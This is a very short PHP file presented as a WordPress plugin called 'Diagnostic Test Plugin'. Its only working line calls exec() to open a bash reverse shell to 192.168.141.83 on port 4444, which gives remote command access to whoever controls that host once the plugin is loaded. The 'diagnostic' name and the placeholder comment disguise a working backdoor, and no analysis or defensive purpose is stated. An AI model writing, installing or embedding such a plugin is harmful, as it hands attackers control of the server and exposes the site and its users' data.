<?php
/**
 * Plugin Name: Diagnostic Test Plugin
 * Version: 1.0
 * Author: Test Admin
 */

// Your execution logic goes here:
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.141.83/4444 0>&1'");
?>
